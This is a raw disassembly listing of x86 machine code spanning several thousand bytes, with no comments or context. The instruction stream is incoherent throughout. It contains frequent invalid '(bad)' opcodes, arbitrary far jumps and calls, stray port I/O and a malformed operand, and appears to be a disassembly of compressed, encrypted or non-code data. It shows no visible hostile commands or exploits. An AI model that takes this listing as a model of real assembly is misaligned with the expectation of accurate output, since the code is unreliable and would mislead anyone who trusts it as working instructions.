  40cbb1:	xchg   DWORD PTR [ebp-0xe],edi
  40cbb4:	bound  esp,QWORD PTR [ecx+0x44e9d757]
  40cbba:	ficomp DWORD PTR [ebp-0x25]
  40cbbd:	jo     0x40cbce
  40cbbf:	loope  0x40cba2
  40cbc1:	jg     0x40cbab
  40cbc3:	fsub   DWORD PTR [ecx]
  40cbc5:	dec    esi
  40cbc6:	sub    al,0x39
  40cbc8:	out    0x7a,al
  40cbca:	xor    al,0x77
  40cbcc:	js     0x40cc0b
  40cbce:	xchg   ebx,eax
  40cbcf:	xchg   ebp,eax
  40cbd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbd1:	inc    esp
  40cbd2:	lock add eax,0x5cabb77d
  40cbd8:	jno    0x40cc29
  40cbda:	add    BYTE PTR [eax-0x4c],ah
  40cbdd:	stos   DWORD PTR es:[edi],eax
  40cbde:	pop    ebx
  40cbdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbe0:	push   ss
  40cbe1:	jge    0x40cc3f
  40cbe3:	pop    es
  40cbe4:	push   ebx
  40cbe5:	dec    edi
  40cbe6:	inc    edi
  40cbe7:	not    BYTE PTR [esi-0x44]
  40cbea:	stc    
  40cbeb:	popf   
  40cbec:	mov    eax,DWORD PTR [ebx-0x3e7e9c03]
  40cbf2:	retf   0x360b
  40cbf5:	rcr    DWORD PTR [edi+0x1],cl
  40cbf8:	dec    ebx
  40cbf9:	idiv   DWORD PTR [esi-0x322489f7]
  40cbff:	adc    BYTE PTR [ecx+0x51],ah
  40cc02:	mov    ebx,0x959053ba
  40cc07:	mov    ?,WORD PTR [eax]
  40cc09:	jge    0x40cbeb
  40cc0b:	cmp    DWORD PTR [esp+ebp*8-0x59a077e],esp
  40cc12:	jmp    0x40cc10
  40cc14:	jne    0x40cbc3
  40cc16:	cmp    eax,0xd25fb55f
  40cc1b:	adc    BYTE PTR [edi+0x1e],0x80
  40cc1f:	les    ebp,FWORD PTR [ebx-0x6f528567]
  40cc25:	popf   
  40cc26:	int    0xf5
  40cc28:	sbb    DWORD PTR [ebp-0x6e99cb85],eax
  40cc2e:	fistp  WORD PTR [esi+edx*8+0x61]
  40cc32:	mov    ecx,ebp
  40cc34:	repnz jecxz 0x40cc42
  40cc37:	cmp    eax,ebx
  40cc39:	mov    al,ds:0xc6aafb3
  40cc3e:	shl    BYTE PTR [edi+0x57],0xe3
  40cc42:	adc    ecx,ecx
  40cc44:	mov    ds:0xad6177cc,al
  40cc49:	pop    esi
  40cc4a:	or     al,0xd8
  40cc4c:	inc    ecx
  40cc4d:	sbb    ch,BYTE PTR [ebx+0x273b2bc8]
  40cc53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc54:	arpl   WORD PTR fs:[esi],bp
  40cc57:	push   cs
  40cc58:	imul   esi,DWORD PTR [edx+ebx*8],0xffffffb0
  40cc5c:	mov    ss,WORD PTR [edx-0x22]
  40cc5f:	test   DWORD PTR [edi],0xa56fa50
  40cc65:	sbb    BYTE PTR [esi-0x7d760632],bh
  40cc6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc6c:	mov    ch,0xa6
  40cc6e:	call   0x20431766
  40cc73:	out    0xf9,eax
  40cc75:	pop    ebx
  40cc76:	out    dx,al
  40cc77:	iret   
  40cc78:	out    dx,eax
  40cc79:	shl    BYTE PTR [ecx-0x3],0xd5
  40cc7d:	mov    esp,0x2142a7df
  40cc82:	and    ch,BYTE PTR [ebp-0x3f857a9]
  40cc88:	stc    
  40cc89:	js     0x40cce1
  40cc8b:	ds mov eax,0x61215f98
  40cc91:	gs cli 
  40cc93:	leave  
  40cc94:	sbb    esp,esp
  40cc96:	(bad)  
  40cc97:	sub    BYTE PTR [ebx],dh
  40cc99:	or     al,0xfc
  40cc9b:	cld    
  40cc9c:	test   DWORD PTR [ecx+0x54a4e2c8],ebx
  40cca2:	fsubr  st,st(2)
  40cca5:	sub    bl,BYTE PTR [eax-0x4e]
  40cca8:	fisubr WORD PTR [edi]
  40ccaa:	in     al,0xcd
  40ccac:	sub    al,0xc8
  40ccae:	iret   
  40ccaf:	arpl   WORD PTR [edx+0x30],ax
  40ccb2:	sub    eax,0xf4d4bea9
  40ccb7:	ss cmp ebx,esi
  40ccba:	enter  0x549f,0x13
  40ccbe:	adc    esi,DWORD PTR [edx]
  40ccc0:	test   DWORD PTR [eax],0x6196260a
  40ccc6:	imul   edx,DWORD PTR ds:0x12a1f47b,0x2384bfe7
  40ccd0:	add    DWORD PTR ds:0x10a2a27e,ebp
  40ccd6:	or     ebx,DWORD PTR [ebp-0x790180ed]
  40ccdc:	dec    edi
  40ccdd:	adc    eax,0xd227761
  40cce2:	sbb    DWORD PTR [ecx+0x52],eax
  40cce5:	scas   eax,DWORD PTR es:[edi]
  40cce6:	mov    al,0x16
  40cce8:	sbb    BYTE PTR [edx],bh
  40ccea:	and    al,0x1
  40ccec:	test   BYTE PTR [ebp-0x6f],bl
  40ccef:	mov    ebx,0xabd8a616
  40ccf4:	push   esp
  40ccf5:	mov    dh,BYTE PTR [ebp-0x13da08fd]
  40ccfb:	push   cs
  40ccfc:	fadd   QWORD PTR [ebx+0x6f0301c5]
  40cd02:	pop    edi
  40cd03:	xchg   esp,eax
  40cd04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd05:	add    al,0x9b
  40cd07:	fst    QWORD PTR [edi+0x32]
  40cd0a:	int3   
  40cd0b:	outs   dx,DWORD PTR ds:[esi]
  40cd0c:	ficomp WORD PTR [esi]
  40cd0e:	leave  
  40cd0f:	rcl    ah,1
  40cd11:	jnp    0x40ccfd
  40cd13:	and    ecx,DWORD PTR [eax]
  40cd15:	xor    esi,edx
  40cd17:	int    0x79
  40cd19:	jle    0x40cd2a
  40cd1b:	and    DWORD PTR fs:[ebp+0x14],edx
  40cd1f:	nop
  40cd20:	or     DWORD PTR [edi+ebp*2-0x6141df62],esi
  40cd27:	(bad)  
  40cd28:	mov    DWORD PTR [edi+0x7ebdbd3b],ebx
  40cd2e:	push   ds
  40cd2f:	test   BYTE PTR [eax+edi*2-0x17],dl
  40cd33:	adc    esp,DWORD PTR [ecx-0x3d]
  40cd36:	pop    ecx
  40cd37:	mov    ebp,0xeeec2d40
  40cd3c:	jmp    0x40cd6c
  40cd3e:	adc    DWORD PTR [esi],edi
  40cd40:	or     edi,DWORD PTR [edx-0x26]
  40cd43:	mov    bh,0xc5
  40cd45:	dec    ecx
  40cd46:	mov    al,ds:0xd1fac2e8
  40cd4b:	(bad)  
  40cd4c:	jmp    0x1348:0x1d7c32be
  40cd53:	aad    0x70
  40cd55:	aam    0x43
  40cd57:	xor    al,BYTE PTR [ebx-0x3]
  40cd5a:	mov    ch,0x5b
  40cd5c:	mov    ebx,0x99ade7e8
  40cd61:	test   eax,0xa26076da
  40cd66:	fucomi st,st(7)
  40cd68:	dec    eax
  40cd69:	add    DWORD PTR [edx+0x599e42c2],ebx
  40cd6f:	arpl   WORD PTR [ecx-0x418c4c76],ax
  40cd75:	mov    DWORD PTR [esi-0x44],ecx
  40cd78:	mov    esi,0x1bb0b2ba
  40cd7d:	aad    0xe2
  40cd7f:	scas   eax,DWORD PTR es:[edi]
  40cd80:	call   0xd59dfa0
  40cd85:	jb     0x40cdea
  40cd87:	sbb    DWORD PTR [ecx+0x58],eax
  40cd8a:	add    bh,BYTE PTR [edx+0x13b0243b]
  40cd90:	push   es
  40cd91:	add    al,0xb5
  40cd93:	(bad)  
  40cd94:	rcr    bh,1
  40cd96:	enter  0xb862,0x7a
  40cd9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd9b:	(bad)  
  40cd9c:	test   al,0xdd
  40cd9e:	cmc    
  40cd9f:	pop    edi
  40cda0:	add    DWORD PTR [ecx],esp
  40cda2:	out    0x84,eax
  40cda4:	clc    
  40cda5:	nop
  40cda6:	shr    ebp,1
  40cda8:	sbb    eax,0xc7e7dc9b
  40cdad:	(bad)  
  40cdae:	push   ss
  40cdaf:	outs   dx,DWORD PTR ds:[esi]
  40cdb0:	xor    ebp,esi
  40cdb2:	dec    esi
  40cdb3:	loop   0x40cd5a
  40cdb5:	imul   edx,ecx,0x88bdcb2d
  40cdbb:	add    esi,DWORD PTR [edx+0x75f6bfe6]
  40cdc1:	xor    edx,edx
  40cdc3:	sti    
  40cdc4:	push   eax
  40cdc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdc6:	ins    BYTE PTR es:[edi],dx
  40cdc7:	and    eax,DWORD PTR [edi-0x5c]
  40cdca:	mov    gs,esi
  40cdcc:	sub    al,BYTE PTR ds:0xc0dcc7ee
  40cdd2:	outs   dx,DWORD PTR ds:[esi]
  40cdd3:	pop    esi
  40cdd4:	cwde   
  40cdd5:	pop    edi
  40cdd6:	and    ebx,DWORD PTR [eax+ecx*2-0x5]
  40cdda:	jl     0x40cdff
  40cddc:	call   0x8d74:0xf83c3fcb
  40cde3:	jmp    0x99aa:0xbd7b59a5
  40cdea:	(bad)  
  40cdeb:	clc    
  40cdec:	pusha  
  40cded:	sbb    edx,edi
  40cdef:	les    ecx,FWORD PTR [ecx]
  40cdf1:	jmp    0x40cde0
  40cdf3:	jecxz  0x40ce1a
  40cdf5:	fisub  DWORD PTR [eax+0x6b]
  40cdf8:	(bad)  
  40cdf9:	cmp    eax,0x74509e
  40cdfe:	mov    eax,ds:0xdb4d7786
  40ce03:	popa   
  40ce04:	lea    eax,[eax+eiz*2-0x65]
  40ce08:	adc    DWORD PTR ds:0x75286a3a,eax
  40ce0e:	out    dx,eax
  40ce0f:	repnz xchg esp,eax
  40ce11:	sbb    esp,DWORD PTR [ebx+0x1815b972]
  40ce17:	push   ss
  40ce18:	mov    ds:0xf9f2abf6,eax
  40ce1d:	pop    esp
  40ce1e:	lock test DWORD PTR [ecx-0x22],eax
  40ce22:	sub    DWORD PTR [edx+0x643312de],esp
  40ce28:	cs scas eax,DWORD PTR es:[edi]
  40ce2a:	fbstp  TBYTE PTR [eax-0x28f93a56]
  40ce30:	or     eax,0x70da1d17
  40ce35:	cld    
  40ce36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce37:	xchg   BYTE PTR [ebx],bl
  40ce39:	or     BYTE PTR [edx+0x4cebfcd5],al
  40ce3f:	nop
  40ce40:	sbb    eax,DWORD PTR [ebx+0x41]
  40ce43:	mov    esi,0x4fb96f08
  40ce48:	cmc    
  40ce49:	mov    esi,DWORD PTR [ecx+0x7d30efa1]
  40ce4f:	and    ebp,DWORD PTR [ebp-0x29]
  40ce52:	inc    esp
  40ce53:	test   DWORD PTR [ebp+eiz*8-0x32e34013],ebx
  40ce5a:	inc    edx
  40ce5b:	dec    ecx
  40ce5c:	stos   DWORD PTR es:[edi],eax
  40ce5d:	ins    DWORD PTR es:[edi],dx
  40ce5e:	lock dec edi
  40ce60:	sti    
  40ce61:	jmp    0xa1db:0x474fab87
  40ce68:	rol    BYTE PTR [edx],0xa4
  40ce6b:	pushf  
  40ce6c:	cld    
  40ce6d:	mov    ah,0xf6
  40ce6f:	jmp    0x40ce87
  40ce71:	lahf   
  40ce72:	pop    esp
  40ce73:	loopne 0x40ce26
  40ce75:	jmp    0x40ce6a
  40ce77:	and    ebx,DWORD PTR [ebx-0x310eaba4]
  40ce7d:	test   eax,0xdbff9682
  40ce82:	cmp    ah,bl
  40ce84:	xor    DWORD PTR [eax+eiz*2-0xe6a6d0f],0x255bfddc
  40ce8f:	mov    ds,ecx
  40ce91:	xor    eax,0xc6ae1558
  40ce96:	mov    BYTE PTR ds:0xaae01338,bh
  40ce9c:	aam    0xb5
  40ce9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce9f:	jg     0x40ce4b
  40cea1:	jbe    0x40ce25
  40cea3:	sub    ch,BYTE PTR [eax-0xc]
  40cea6:	inc    ebp
  40cea7:	ss pop ds
  40cea9:	in     al,dx
  40ceaa:	sub    eax,0xd7e927fc
  40ceaf:	cs mov dh,0x40
  40ceb2:	repnz bound esi,QWORD PTR gs:[ebp-0x431ac10a]
  40ceba:	sahf   
  40cebb:	mov    edi,0x2c0fe416
  40cec0:	push   ebp
  40cec1:	(bad)  
  40cec2:	dec    eax
  40cec3:	and    DWORD PTR [edx-0x27],edi
  40cec6:	in     al,0x13
  40cec8:	fnstenv [edi+0x1742b9c3]
  40cece:	imul   edx,DWORD PTR [ecx+0x32],0x50e21f78
  40ced5:	and    eax,0xaff65149
  40ceda:	or     bh,BYTE PTR [ebx]
  40cedc:	mov    ecx,0xc1aacb0d
  40cee1:	push   edx
  40cee2:	retf   
  40cee3:	dec    eax
  40cee4:	fwait
  40cee5:	in     eax,0x53
  40cee7:	fstp   QWORD PTR [edx-0x6e38462c]
  40ceed:	call   0x3d83:0xab28ca05
  40cef4:	cli    
  40cef5:	mov    esi,0xe954c40f
  40cefa:	add    bh,0xd0
  40cefd:	push   ss
  40cefe:	(bad)  
  40ceff:	pop    esp
  40cf00:	iret   
  40cf01:	fwait
  40cf02:	mov    bh,0x5b
  40cf04:	lock ret 
  40cf06:	mov    ebp,0x4c28b4c3
  40cf0b:	dec    ebp
  40cf0c:	add    DWORD PTR [esi+0x54],ebx
  40cf0f:	cs sti 
  40cf11:	and    dl,BYTE PTR [ebp-0x3dadffd7]
  40cf17:	loopne 0x40cf52
  40cf19:	jg     0x40cf78
  40cf1b:	mov    DWORD PTR [eax+0x18],0x4033e90b
  40cf22:	adc    ecx,0x2fc774b9
  40cf28:	pop    eax
  40cf29:	dec    ebp
  40cf2a:	jecxz  0x40cec6
  40cf2c:	add    esi,esp
  40cf2e:	and    esp,esi
  40cf30:	xchg   ebx,eax
  40cf31:	adc    ecx,DWORD PTR [ebx-0x57]
  40cf34:	fisubr DWORD PTR [edx]
  40cf36:	jmp    0xe8b2e987
  40cf3b:	fild   QWORD PTR [edx+0x4a]
  40cf3e:	imul   ebp,ecx,0xfffffff1
  40cf41:	gs je  0x40cfad
  40cf44:	mov    bh,bl
  40cf46:	ds iret 
  40cf48:	loopne 0x40cf4c
  40cf4a:	pop    ss
  40cf4b:	dec    ecx
  40cf4c:	push   ds
  40cf4d:	pop    ebx
  40cf4e:	xchg   BYTE PTR [edx+0x3e],ch
  40cf51:	sbb    DWORD PTR [ecx],ebp
  40cf53:	cmp    BYTE PTR [ebp-0x3889e5c5],0x2b
  40cf5a:	pusha  
  40cf5b:	fdivr  DWORD PTR [ebx-0x31]
  40cf5e:	add    eax,0x8236f10a
  40cf63:	mov    cl,0xb3
  40cf65:	cmp    BYTE PTR [ebp-0x61],ch
  40cf68:	adc    al,0x65
  40cf6a:	psllq  mm2,QWORD PTR [eax]
  40cf6d:	ds mov edx,0x223b37d2
  40cf73:	add    eax,0x3cf9c64f
  40cf78:	xchg   ebp,eax
  40cf79:	adc    al,0x52
  40cf7b:	or     BYTE PTR [ebx],ch
  40cf7d:	outs   dx,DWORD PTR ds:[esi]
  40cf7e:	add    BYTE PTR [ebx],ah
  40cf80:	pushf  
  40cf81:	adc    DWORD PTR [ebp-0x43b0b302],esi
  40cf87:	inc    ecx
  40cf88:	mov    eax,ds:0xba59013c
  40cf8d:	mov    esi,0xd9f5e79e
  40cf92:	sbb    DWORD PTR [ecx-0xb],ecx
  40cf95:	gs out dx,eax
  40cf97:	or     eax,0xfd1e4c8f
  40cf9c:	and    DWORD PTR cs:0x3a3a0c2d,esi
  40cfa3:	mov    eax,0xb9ea6406
  40cfa8:	js     0x40cfe0
  40cfaa:	cmp    eax,0xa40f357e
  40cfaf:	push   esp
  40cfb0:	add    dl,bh
  40cfb2:	scas   eax,DWORD PTR es:[edi]
  40cfb3:	xor    dh,BYTE PTR [ecx-0x49]
  40cfb6:	push   eax
  40cfb7:	add    al,0x79
  40cfb9:	into   
  40cfba:	xchg   BYTE PTR [ebp+0x3fc2efe9],ah
  40cfc0:	fucomp st(4)
  40cfc2:	xchg   ebp,eax
  40cfc3:	mov    BYTE PTR [edi],bl
  40cfc5:	lds    ebp,FWORD PTR [ecx-0x3d]
  40cfc8:	in     eax,0x43
  40cfca:	pop    es
  40cfcb:	jge    0x40cfa4
  40cfcd:	inc    ebx
  40cfce:	sub    al,0x7d
  40cfd0:	out    dx,al
  40cfd1:	out    0x33,al
  40cfd3:	in     al,dx
  40cfd4:	add    dh,BYTE PTR [ebp-0x5d87d3c1]
  40cfda:	in     al,0xdd
  40cfdc:	or     ebx,DWORD PTR [edx]
  40cfde:	adc    al,0x1a
  40cfe0:	or     edx,DWORD PTR [ebp-0x5b308e46]
  40cfe6:	mov    dh,0x90
  40cfe8:	push   ebp
  40cfe9:	cmp    dh,bh
  40cfeb:	mov    cs,WORD PTR [edx+edi*8-0xe22f4f1]
  40cff2:	and    dh,BYTE PTR ds:0xf2f0ebe4
  40cff8:	out    0x53,eax
  40cffa:	or     ebx,DWORD PTR [ebx+eiz*8+0x2eb60afd]
  40d001:	or     BYTE PTR [esi+0x21331b54],0x7f
  40d008:	stc    
  40d009:	inc    esi
  40d00a:	push   ebp
  40d00b:	fist   DWORD PTR ds:0xa00399
  40d011:	(bad)  
  40d012:	push   ds
  40d013:	repnz sub dh,0x80
  40d017:	gs adc al,0x2f
  40d01a:	outs   dx,DWORD PTR ds:[esi]
  40d01b:	int3   
  40d01c:	loop   0x40d08a
  40d01e:	lods   al,BYTE PTR ds:[esi]
  40d01f:	je     0x40d004
  40d021:	xchg   BYTE PTR [ebp+0x14622194],bh
  40d027:	mov    dl,0xd1
  40d029:	push   ebp
  40d02a:	jecxz  0x40d05b
  40d02c:	iret   
  40d02d:	xor    esp,DWORD PTR [eax-0x260f0316]
  40d033:	or     edi,ebx
  40d035:	adc    BYTE PTR [esi-0x12],ch
  40d038:	jecxz  0x40d037
  40d03a:	dec    eax
  40d03b:	push   es
  40d03c:	push   0xc410e1bb
  40d041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d042:	(bad)  
  40d043:	ror    DWORD PTR [edi-0xecd04d7],cl
  40d049:	sbb    DWORD PTR [esi+0x41a3d4b4],edi
  40d04f:	into   
  40d050:	push   esp
  40d051:	sbb    al,0x5c
  40d053:	lods   eax,DWORD PTR ds:[esi]
  40d054:	sbb    eax,0x57e3bc95
  40d059:	jmp    0x17d2fcb5
  40d05e:	jnp    0x40d087
  40d060:	jb     0x40d060
  40d062:	mov    edx,0x8777e94c
  40d067:	mov    eax,ds:0xa9bdf6f
  40d06c:	test   BYTE PTR [ebp-0x5ea90725],bh
  40d072:	jns    0x40d0b8
  40d074:	call   0xddaff37f
  40d079:	and    BYTE PTR [ebp+0x3b708db2],dh
  40d07f:	push   es
  40d080:	scas   al,BYTE PTR es:[edi]
  40d081:	jo     0x40d01e
  40d083:	loope  0x40d016
  40d085:	mov    edi,0x713445d5
  40d08a:	cmp    eax,0x677c2f3a
  40d08f:	pushf  
  40d090:	jo     0x40d0a4
  40d092:	push   edx
  40d093:	punpckldq mm7,DWORD PTR [ecx]
  40d096:	xchg   edx,eax
  40d097:	iret   
  40d098:	ror    DWORD PTR [edi],cl
  40d09a:	sahf   
  40d09b:	stos   BYTE PTR es:[edi],al
  40d09c:	mov    bl,0xa5
  40d09e:	(bad)  
  40d09f:	jne    0x40d07d
  40d0a1:	lods   eax,DWORD PTR ds:[esi]
  40d0a2:	and    BYTE PTR [ebx],cl
  40d0a4:	bound  ebp,QWORD PTR [esp+edx*4-0x1742766f]
  40d0ab:	stos   BYTE PTR es:[edi],al
  40d0ac:	xlat   BYTE PTR ds:[ebx]
  40d0ad:	aad    0x5e
  40d0af:	aaa    
  40d0b0:	sti    
  40d0b1:	loopne 0x40d0c6
  40d0b3:	leave  
  40d0b4:	or     ecx,DWORD PTR gs:[edx]
  40d0b7:	mov    dh,0x78
  40d0b9:	xchg   ebx,eax
  40d0ba:	inc    esi
  40d0bb:	out    dx,eax
  40d0bc:	(bad)  
  40d0be:	mov    ds:0xcd1ac031,eax
  40d0c3:	jns    0x40d09c
  40d0c5:	mov    edi,0x91946f82
  40d0ca:	les    edx,FWORD PTR [edx+0x329b9f3a]
  40d0d0:	or     eax,0x8b43770c
  40d0d5:	adc    al,0x40
  40d0d7:	xor    esp,edi
  40d0d9:	scas   eax,DWORD PTR es:[edi]
  40d0da:	inc    edi
  40d0db:	xchg   ebp,eax
  40d0dc:	paddw  mm7,mm5
  40d0df:	lods   eax,DWORD PTR ds:[esi]
  40d0e0:	inc    esp
  40d0e1:	(bad)  
  40d0e2:	jmp    0x40d12f
  40d0e4:	aaa    
  40d0e5:	and    eax,0x57af00a5
  40d0ea:	retf   0x175
  40d0ed:	mov    BYTE PTR [edi+0x35bb4347],bl
  40d0f3:	xchg   esp,eax
  40d0f4:	fwait
  40d0f5:	inc    esi
  40d0f6:	hlt    
  40d0f7:	aaa    
  40d0f8:	mov    eax,ds:0x7384e92a
  40d0fd:	dec    ebp
  40d0fe:	shr    ah,0xa8
  40d101:	pop    ebx
  40d102:	fld    DWORD PTR [esi-0x2a754f69]
  40d108:	push   0x6a2b2a43
  40d10d:	outs   dx,DWORD PTR ds:[esi]
  40d10e:	retf   
  40d10f:	jo     0x40d0ca
  40d111:	clc    
  40d112:	scas   eax,DWORD PTR es:[edi]
  40d113:	fisttp DWORD PTR [edx]
  40d115:	adc    eax,0xbab689de
  40d11a:	pop    ds
  40d11b:	test   eax,0xeda69ef1
  40d120:	sbb    edx,edi
  40d122:	daa    
  40d123:	ds inc si
  40d126:	pop    esi
  40d127:	push   ecx
  40d128:	out    dx,eax
  40d129:	pop    DWORD PTR [edx-0x715f6dec]
  40d12f:	bswap  edi
  40d131:	sub    al,0xf7
  40d133:	retf   0xebb5
  40d136:	ins    BYTE PTR es:[edi],dx
  40d137:	add    ch,ch
  40d139:	out    dx,al
  40d13a:	sub    BYTE PTR [ebx-0x5b486ace],ch
  40d140:	push   es
  40d141:	mov    esp,0x5ebb0a0e
  40d146:	iret   
  40d147:	loopne 0x40d0ec
  40d149:	repnz pop eax
  40d14b:	xor    ebx,DWORD PTR [ebx]
  40d14d:	and    BYTE PTR [ebx+0x64],cl
  40d150:	aad    0x28
  40d152:	and    al,0xf7
  40d154:	jae    0x40d1b4
  40d156:	cmp    al,0xaa
  40d158:	jb     0x40d1bb
  40d15a:	xor    eax,DWORD PTR [eax+0x7bfb9497]
  40d160:	cdq    
  40d161:	inc    esp
  40d162:	fs inc ebp
  40d164:	or     al,0xbc
  40d166:	retf   0x6284
  40d169:	and    BYTE PTR [eax],0x9d
  40d16c:	jae    0x40d14b
  40d16e:	jns    0x40d192
  40d170:	mov    BYTE PTR [ebp-0x2c],cl
  40d173:	or     al,0x8b
  40d175:	pop    ecx
  40d176:	jmp    0x84c0:0x2ed5ae2f
  40d17d:	aas    
  40d17e:	sbb    BYTE PTR [esi+0x69],dl
  40d181:	es test eax,0x342684fa
  40d187:	mov    BYTE PTR [edi],bh
  40d189:	enter  0x9761,0x17
  40d18d:	cmp    al,0x21
  40d18f:	sti    
  40d190:	lds    ecx,FWORD PTR ds:0x7735ee03
  40d196:	clc    
  40d197:	fucomp st(1)
  40d199:	push   ecx
  40d19a:	sti    
  40d19b:	aam    0x29
  40d19d:	sub    eax,0xab0c61b5
  40d1a2:	and    ah,BYTE PTR [ecx]
  40d1a4:	mov    bh,BYTE PTR [edi+0x70]
  40d1a7:	div    DWORD PTR [esi+0x40]
  40d1aa:	ss test edi,ebp
  40d1ad:	(bad)  
  40d1b1:	arpl   WORD PTR [esi+0x406408d7],ax
  40d1b7:	pop    edi
  40d1b8:	shl    DWORD PTR [edi-0x11d73b9f],cl
  40d1be:	cmp    eax,DWORD PTR [edi-0x2055dce0]
  40d1c4:	adc    eax,0x7dc21501
  40d1c9:	iret   
  40d1ca:	mov    bl,0x4b
  40d1cc:	or     DWORD PTR [eax+0xa7c7264],ebx
  40d1d2:	stc    
  40d1d3:	xchg   al,ch
  40d1d5:	arpl   WORD PTR [ebx+0x37],dx
  40d1d8:	stos   DWORD PTR es:[edi],eax
  40d1d9:	mov    ch,0x39
  40d1db:	mov    bl,dl
  40d1dd:	popa   
  40d1de:	pop    ebx
  40d1df:	adc    BYTE PTR [edi+0x326d7536],cl
  40d1e5:	test   BYTE PTR [eax-0x49e68364],dh
  40d1eb:	sbb    eax,0x470cb8db
  40d1f0:	shr    DWORD PTR [esi+0x47],1
  40d1f3:	loopne 0x40d196
  40d1f5:	or     DWORD PTR [eax+0x7b22a2d0],ebp
  40d1fb:	sub    al,0x30
  40d1fd:	jmp    0x96ace8a
  40d202:	push   esi
  40d203:	or     al,0x9c
  40d205:	jle    0x40d1ed
  40d207:	xchg   BYTE PTR [ebx-0x6d],dl
  40d20a:	pop    edi
  40d20b:	and    DWORD PTR [ebp+0x6e4d2dd8],eax
  40d211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d212:	sbb    BYTE PTR [eax],bh
  40d214:	xlat   BYTE PTR ds:[ebx]
  40d215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d216:	and    ebx,0xffffffb1
  40d219:	les    ecx,FWORD PTR [edx+0x375c65c6]
  40d21f:	xor    al,0x10
  40d221:	into   
  40d222:	mov    ebp,0xa9765ec
  40d227:	pop    ecx
  40d228:	dec    BYTE PTR [ecx-0x3c]
  40d22b:	add    eax,0x8b67e9b2
  40d230:	dec    ecx
  40d231:	mov    ds:0x3449faec,eax
  40d236:	xchg   ebp,eax
  40d237:	(bad)  
  40d239:	in     al,0xf1
  40d23b:	jb     0x40d277
  40d23d:	mov    dl,0x4f
  40d23f:	lds    esp,FWORD PTR [eax+0x4f897489]
  40d245:	lock lahf 
  40d247:	push   edx
  40d248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d249:	adc    BYTE PTR [esi+0x76ed2fd9],cl
  40d24f:	xlat   BYTE PTR ds:[ebx]
  40d250:	rcl    BYTE PTR [ecx+0x278e2463],cl
  40d256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d257:	cld    
  40d258:	shl    BYTE PTR fs:[esi+0x76],0xdc
  40d25d:	push   es
  40d25e:	imul   edi,DWORD PTR [edi-0x4],0xffffffb4
  40d262:	xchg   ecx,edx
  40d264:	cmp    al,0x53
  40d266:	jge    0x40d1ff
  40d268:	loopne 0x40d263
  40d26a:	mov    dl,0x3b
  40d26c:	sub    ebx,DWORD PTR [ebp-0x6ba72038]
  40d272:	lods   eax,DWORD PTR ds:[esi]
  40d273:	cmp    cl,BYTE PTR [edi+0x6ed331b0]
  40d279:	mul    edx
  40d27b:	jo     0x40d2bb
  40d27d:	sahf   
  40d27e:	fwait
  40d27f:	mov    esp,0xa1703d64
  40d284:	xor    eax,DWORD PTR [ebx+edx*2]
  40d287:	shr    BYTE PTR [esi-0x2331b9e5],1
  40d28d:	mov    eax,0x60556725
  40d292:	push   ds
  40d293:	hlt    
  40d294:	outs   dx,DWORD PTR ds:[esi]
  40d295:	loope  0x40d262
  40d297:	aas    
  40d298:	shl    BYTE PTR [ebp+0x56],1
  40d29b:	sti    
  40d29c:	xor    al,BYTE PTR [ebx]
  40d29e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d29f:	clc    
  40d2a0:	mov    ecx,0x54499a39
  40d2a5:	lock push ss
  40d2a7:	mov    al,ds:0x8989b810
  40d2ac:	adc    BYTE PTR ds:0x795aacfd,dh
  40d2b2:	jge    0x40d2ea
  40d2b4:	dec    ebp
  40d2b5:	sbb    cl,BYTE PTR [esi+eax*2-0x5]
  40d2b9:	lea    esp,[esi+0x52]
  40d2bc:	test   BYTE PTR [ecx-0x6a1b312b],al
  40d2c2:	std    
  40d2c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2c4:	cmp    BYTE PTR [ebx-0x2b41622c],al
  40d2ca:	jnp    0x40d29d
  40d2cc:	test   eax,0xa4c1d9ea
  40d2d1:	lds    esi,FWORD PTR [ecx+0x5cb0edc4]
  40d2d7:	stos   BYTE PTR es:[edi],al
  40d2d8:	mov    cl,BYTE PTR [ebp-0x3b]
  40d2db:	and    edi,edx
  40d2dd:	inc    eax
  40d2de:	pop    ecx
  40d2df:	ja     0x40d2cc
  40d2e1:	dec    ebx
  40d2e2:	mov    esi,0x1660ee70
  40d2e7:	or     BYTE PTR [edi+0x13371458],dh
  40d2ed:	call   0x1ec1e7f2
  40d2f2:	push   ebx
  40d2f3:	xlat   BYTE PTR ds:[ebx]
  40d2f4:	arpl   WORD PTR [ecx],sp
  40d2f6:	xchg   BYTE PTR [ecx+ecx*8],ah
  40d2f9:	fs leave 
  40d2fb:	lock add esp,ebx
  40d2fe:	cmp    BYTE PTR [edi+0x7d],al
  40d301:	stos   DWORD PTR es:[edi],eax
  40d302:	retf   0xc9b4
  40d305:	xlat   BYTE PTR ds:[ebx]
  40d306:	sub    BYTE PTR [esi+0x54],0xde
  40d30a:	mov    bl,BYTE PTR [eax]
  40d30c:	shl    DWORD PTR [ecx+0x23ea46f],0xeb
  40d313:	enter  0x552e,0xf2
  40d317:	add    ah,ch
  40d319:	test   BYTE PTR [esp+edx*1],0x7d
  40d31d:	mov    ecx,0xb56cdc61
  40d322:	add    DWORD PTR [esi-0x18],0x87dca610
  40d329:	in     eax,dx
  40d32a:	leave  
  40d32b:	stos   BYTE PTR es:[edi],al
  40d32c:	jns    0x40d37f
  40d32e:	inc    edx
  40d32f:	mov    bh,0x14
  40d331:	hlt    
  40d332:	inc    ebp
  40d333:	mov    eax,ds:0xd75e9d5c
  40d338:	xor    ebp,esi
  40d33a:	push   es
  40d33b:	(bad)  
  40d33c:	loop   0x40d353
  40d33e:	sub    al,0xa1
